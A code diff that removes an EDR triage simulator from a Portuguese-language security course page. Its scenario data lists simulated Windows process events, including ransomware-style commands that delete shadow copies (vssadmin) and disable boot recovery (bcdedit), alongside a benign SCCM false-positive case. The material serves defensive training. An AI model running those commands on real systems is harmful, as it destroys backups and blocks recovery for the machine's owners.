-                    processo: "invoice_viewer.exe",
-                    pid: 6420,
-                    ppid: 1044,
-                    pai: "explorer.exe",
-                    user: "FINANCE\\m.silva",
-                    cmd: '"C:\\Users\\m.silva\\AppData\\Local\\Temp\\invoice_viewer.exe"',
-                    hash: "e99c1042781a...",
-                    mitre: "T1204.002 - Malicious File Execution",
-                    alerta: true
-                },
-                {
-                    id: 2,
-                    time: "14:22:03",
-                    eid: 1,
-                    eidNome: "Process Create (EID 1)",
-                    processo: "vssadmin.exe",
-                    pid: 7012,
-                    ppid: 6420,
-                    pai: "invoice_viewer.exe",
-                    user: "NT AUTHORITY\\SYSTEM",
-                    cmd: 'vssadmin.exe delete shadows /all /quiet',
-                    hash: "d91837a716...",
-                    mitre: "T1490 - Inhibit System Recovery (Exclusão de Cópias de Sombra)",
-                    alerta: true
-                },
-                {
-                    id: 3,
-                    time: "14:22:04",
-                    eid: 1,
-                    eidNome: "Process Create (EID 1)",
-                    processo: "bcdedit.exe",
-                    pid: 7096,
-                    ppid: 6420,
-                    pai: "invoice_viewer.exe",
-                    user: "NT AUTHORITY\\SYSTEM",
-                    cmd: 'bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit.exe /set {default} recoveryenabled no',
-                    hash: "82a912803b...",
-                    mitre: "T1490 - Inhibit System Recovery (Desativação de Reparo do Boot)",
-                    alerta: true
-                }
-            ]
-        },
-        falso_positivo_sccm: {
-            titulo: "Falso Positivo Operacional: Atualização Corporativa via SCCM",
-            severidade: "Informativa (Benigno)",
-            tipo: "benigno",
-            recomendacao: "ignorar_ou_marcar_limpo",
-            eventos: [
-                {
-                    id: 1,
-                    time: "03:15:00",
-                    eid: 1,
-                    eidNome: "Process Create (EID 1)",
-                    processo: "CcmExec.exe",
-                    pid: 1428,
-                    ppid: 684,
-                    pai: "services.exe",
-                    user: "NT AUTHORITY\\SYSTEM",
-                    cmd: 'C:\\Windows\\CCM\\CcmExec.exe',
-                    hash: "11a094bb82...",
-                    mitre: "Operação Legítima: Agente Microsoft Endpoint Configuration Manager",
-                    alerta: false
-                },
-                {
-                    id: 2,
-                    time: "03:15:02",
-                    eid: 1,
-                    eidNome: "Process Create (EID 1)",
-                    processo: "powershell.exe",
-                    pid: 2190,
-                    ppid: 1428,
-                    pai: "CcmExec.exe",
-                    user: "NT AUTHORITY\\SYSTEM",
-                    cmd: 'powershell.exe -ExecutionPolicy Bypass -File "C:\\Windows\\CCM\\SystemHealthCheck.ps1"',
-                    hash: "ee3b890f124c...",
-                    mitre: "Script Assinado Digitalmente pela Autoridade Corporativa (Internal CA)",
-                    alerta: false
-                },
-                {
-                    id: 3,
-                    time: "03:15:05",
-                    eid: 3,
-                    eidNome: "Network Connection (EID 3)",
-                    processo: "powershell.exe",
-                    pid: 2190,
-                    ppid: 1428,
-                    pai: "CcmExec.exe",
-                    user: "NT AUTHORITY\\SYSTEM",
-                    cmd: 'Conexão TCP: 192.168.10.42:51200 -> 192.168.1.10:8530 (Servidor WSUS/SCCM Interno)',
-                    hash: "ee3b890f124c...",
-                    mitre: "Comunicação Interna em Subrede de Gerenciamento Confiável",
-                    alerta: false
-                }
-            ]
-        }
-    };
-
-    let cenarioAtual = "macro_c2_lsass";
-    let eventoSelecionado = null;
-    let hostIsolado = false;
-    let processosMortos = new Set();
-    let triageColetada = false;
-
-    // Função para carregar o cenário no simulador
-    window.carregarCenarioEdr = function(chave) {
-        if (!CENARIOS_EDR[chave]) return;
-        cenarioAtual = chave;
-        eventoSelecionado = null;
-        hostIsolado = false;
-        processosMortos.clear();
-        triageColetada = false;
-
-        atualizarStatusRedeBadge();
-        renderizarEventos();
-        
-        // Seleciona automaticamente o primeiro evento com alerta
-        const cenario = CENARIOS_EDR[chave];
-        const primeiroAlerta = cenario.eventos.find(e => e.alerta) || cenario.eventos[0];
-        if (primeiroAlerta) {
-            window.inspecionarEvento(primeiroAlerta.id);
-        }
-
-        atualizarFeedback("Cenário carregado. Analise os processos na linha do tempo e tome a ação adequada.");
-    };
-
-    function atualizarStatusRedeBadge() {
-        const badge = document.getElementById("host-network-badge");
-        if (!badge) return;
-        if (hostIsolado) {
-            badge.style.background = "rgba(220, 38, 38, 0.2)";
-            badge.style.color = "#DC2626";
-            badge.style.borderColor = "#DC2626";
-            badge.textContent = "● HOST ISOLADO DA REDE (CONTENÇÃO ATIVA)";
-        } else {
-            badge.style.background = "rgba(16, 185, 129, 0.2)";
-            badge.style.color = "#10B981";
-            badge.style.borderColor = "#10B981";
-            badge.textContent = "● HOST ONLINE (REDE ATIVA)";
-        }
-    }
-
-    function renderizarEventos() {
-        const container = document.getElementById("edr-events-list");
-        if (!container) return;
-        container.innerHTML = "";
-
-        const cenario = CENARIOS_EDR[cenarioAtual];
-        cenario.eventos.forEach(ev => {
-            const card = document.createElement("div");
-            card.className = "edr-event-card";
-            card.id = `ev-card-${ev.id}`;
-            const isKilled = processosMortos.has(ev.pid);
-
-            let borderCor = ev.alerta ? "rgba(220, 38, 38, 0.5)" : "var(--rule)";
-            let badgeBg = ev.alerta ? "rgba(220, 38, 38, 0.15)" : "rgba(37, 99, 235, 0.15)";
-            let badgeColor = ev.alerta ? "#DC2626" : "#2563EB";
-
-            card.style.cssText = `
-                background: var(--surface);
-                border: 1px solid ${borderCor};
-                border-left: 4px solid ${badgeColor};
-                padding: 0.65rem 0.85rem;
-                border-radius: 4px;
-                cursor: pointer;
-                transition: all 0.15s ease;
-                opacity: ${isKilled ? '0.45' : '1'};
-                position: relative;
-            `;
-
-            if (isKilled) {
-                card.style.textDecoration = "line-through";
-            }
-
-            card.onclick = () => window.inspecionarEvento(ev.id);
-
-            card.innerHTML = `
-                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.25rem;">
-                    <span style="font-size: 0.75rem; background: ${badgeBg}; color: ${badgeColor}; padding: 0.15rem 0.4rem; border-radius: 3px; font-weight: 700;">
-                        ${ev.eidNome}
-                    </span>
-                    <span style="font-size: 0.75rem; color: var(--muted); font-family: monospace;">${ev.time}</span>
-                </div>
-                <div style="font-weight: 600; font-size: 0.9rem; color: var(--ink);">
-                    ${ev.processo} <span style="font-size: 0.75rem; color: var(--muted); font-weight: normal;">(PID: ${ev.pid} | Pai: ${ev.pai})</span>
-                </div>
-                <div style="font-size: 0.8rem; color: var(--muted); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; margin-top: 0.2rem; font-family: monospace;">
-                    ${ev.cmd}
-                </div>
-            `;
-            container.appendChild(card);
-        });
-    }
-
-    window.inspecionarEvento = function(evId) {
-        const cenario = CENARIOS_EDR[cenarioAtual];
-        const ev = cenario.eventos.find(e => e.id === evId);
-        if (!ev) return;
-        eventoSelecionado = ev;
-
-        // Atualiza estilo visual do selecionado
-        document.querySelectorAll(".edr-event-card").forEach(el => {
-            el.style.boxShadow = "none";
-        });
-        const activeCard = document.getElementById(`ev-card-${evId}`);
-        if (activeCard) {
-            activeCard.style.boxShadow = "0 0 0 2px var(--t2-green, #059669)";
-        }
-
-        const inspector = document.getElementById("edr-inspector-content");
-        if (!inspector) return;
-
-        const isKilled = processosMortos.has(ev.pid);
-
-        inspector.innerHTML = `
-            <div style="margin-bottom: 0.75rem;">
-                <span style="font-size: 0.8rem; background: ${ev.alerta ? 'rgba(220,38,38,0.2)' : 'rgba(37,99,235,0.2)'}; color: ${ev.alerta ? '#DC2626' : '#2563EB'}; padding: 0.2rem 0.5rem; border-radius: 4px; font-weight: 700;">
-                    ${ev.eidNome}
-                </span>
-                ${isKilled ? '<span style="font-size: 0.8rem; background: #DC2626; color: #fff; padding: 0.2rem 0.5rem; border-radius: 4px; font-weight: 700; margin-left: 0.5rem;">[PROCESSO FINALIZADO]</span>' : ''}
-            </div>
-
-            <div style="display: grid; grid-template-columns: 120px 1fr; gap: 0.35rem; font-size: 0.85rem; margin-bottom: 0.75rem;">
-                <div><strong>Processo:</strong></div> <div><code>${ev.processo}</code> (PID: ${ev.pid})</div>
-                <div><strong>Processo Pai:</strong></div> <div><code>${ev.pai}</code> (PPID: ${ev.ppid})</div>
-                <div><strong>Usuário / Contexto:</strong></div> <div><code>${ev.user}</code></div>
-                <div><strong>Hash SHA-256:</strong></div> <div style="font-family: monospace; font-size: 0.75rem; word-break: break-all;">${ev.hash}</div>
-            </div>
-
-            <div style="margin-bottom: 0.75rem;">
-                <div style="font-size: 0.8rem; font-weight: 700; margin-bottom: 0.25rem;">Linha de Comando Completa:</div>
-                <div style="background: var(--sunk, #0f172a); color: #38bdf8; padding: 0.5rem; border-radius: 4px; font-family: monospace; font-size: 0.78rem; word-break: break-all;">
-                    ${ev.cmd}
-                </div>
-            </div>
-
-            <div style="background: rgba(37,99,235,0.08); border-left: 3px solid #2563EB; padding: 0.5rem; border-radius: 3px; font-size: 0.82rem;">
-                <strong>Mapeamento MITRE ATT&CK:</strong><br>
-                ${ev.mitre}
-            </div>
-        `;
-    };
-
-    window.finalizarProcesso = function() {
-        if (!eventoSelecionado) {
-            alert("Selecione um evento na linha do tempo para finalizar o processo.");
-            return;
-        }
-        processosMortos.add(eventoSelecionado.pid);
-        renderizarEventos();
-        window.inspecionarEvento(eventoSelecionado.id);
-
-        const cenario = CENARIOS_EDR[cenarioAtual];
-        if (cenario.tipo === "benigno") {
-            atualizarFeedback(`⚠️ AVISO OPERACIONAL: Você finalizou o processo legítimo ${eventoSelecionado.processo} (PID ${eventoSelecionado.pid}). Em produção, isso interrompe manutenções corporativas legítimas (Falso Positivo).`);
-        } else {
-            atualizarFeedback(`✅ Processo ${eventoSelecionado.processo} (PID ${eventoSelecionado.pid}) e subprocessos finalizados com sucesso pelo driver de kernel do EDR.`);
-        }
-    };
-
-    window.isolarHostRede = function() {
-        hostIsolado = !hostIsolado;
-        atualizarStatusRedeBadge();
-
-        const cenario = CENARIOS_EDR[cenarioAtual];
-        if (hostIsolado) {
-            if (cenario.tipo === "malicioso") {
-                atualizarFeedback("🛡️ EXCELENTE DECISÃO: Host isolado logicamente da rede! O canal C2 e a movimentação lateral foram bloqueados instantaneamente, mantendo o agente EDR online para investigação.");
-            } else {
-                atualizarFeedback("⚠️ ALERTA DE NEGÓCIO: O host foi isolado da rede, mas este cenário tratava-se de um Falso Positivo (SCCM legítimo). Isolar a máquina causou indisponibilidade desnecessária ao usuário final.");
-            }
-        } else {
-            atualizarFeedback("Host reconectado à rede corporativa. Tráfego liberado.");
-        }
-    };
-
-    window.coletarPacoteForense = function() {
-        triageColetada = true;
-        atualizarFeedback("📦 Pacote de Triagem Forense coletado com sucesso! Foram extraídos: Dump de memória dos processos ativos, logs Sysmon das últimas 24h, lista de sockets de rede e cópia das chaves de registro investigadas.");
-    };
-
-    window.resetarInvestigacao = function() {
-        window.carregarCenarioEdr(cenarioAtual);
-    };
-
-    function atualizarFeedback(msg) {
-        const panel = document.getElementById("edr-feedback-panel");
-        if (panel) {
-            panel.innerHTML = `<strong>Status da Investigação:</strong> ${msg}`;
-        }
-    }
-
-    // Inicialização ao carregar a página
-    document.addEventListener("DOMContentLoaded", function() {
-        if (typeof initChecklist === "function") {
-            initChecklist("seguranca-endpoints-edr");
-        }
-        if (typeof initQuiz === "function") {
-            initQuiz();
-        }
-        window.carregarCenarioEdr("macro_c2_lsass");
-    });
-})();
-</script>
+<!-- SCRIPT VANILLA Da checklist EDR -->
 </main>
 </div>
 
@@ -3189,7 +2259,6 @@ dfn.glossario:focus-visible {
 
   const TIPOS = {
     teoria: { icone: '📘', rotulo: 'Teoria' },
-    laboratorio: { icone: '🧪', rotulo: 'Laboratório' },
     checklist: { icone: '☑️', rotulo: 'Checklist' },
     questoes: { icone: '❓', rotulo: 'Questões de concurso' },
     referencias: { icone: '📚', rotulo: 'Referências' },
@@ -3778,17 +2847,6 @@ dfn.glossario:focus-visible {
     });
   }
 
-  // Um simulador pode informar o progresso do laboratório ao sumário (opcional).
-  function labProgress(feitos, total) {
-    const secao = secaoDoTipo('laboratorio');
-    const f = Number(feitos);
-    const t = Number(total);
-    if (!Number.isFinite(f) || !Number.isFinite(t) || t <= 0) {
-      definirContador(secao, '');
-      return;
-    }
-    definirContador(secao, `${Math.max(0, Math.min(f, t))}/${t}`);
-  }
 
   // --------------------------------------------------------------------------
   // 6b. Glossário: tooltip dos termos (<dfn class="glossario">)
@@ -4002,7 +3060,6 @@ dfn.glossario:focus-visible {
   window.CS = {
     init,
     initGlossario,
-    labProgress,
     safeStorageGet,
     safeStorageSet,
     initTheme,
